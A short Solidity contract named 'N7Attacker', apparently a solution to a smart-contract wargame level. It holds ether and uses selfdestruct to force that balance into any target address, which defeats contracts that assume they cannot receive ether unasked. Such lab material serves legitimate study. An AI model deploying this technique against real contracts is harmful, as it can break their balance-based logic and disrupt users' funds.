// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract N7Attacker {
    receive() external payable {}

    function attack(address payable targetAddress) external {
        selfdestruct(targetAddress);
    }
}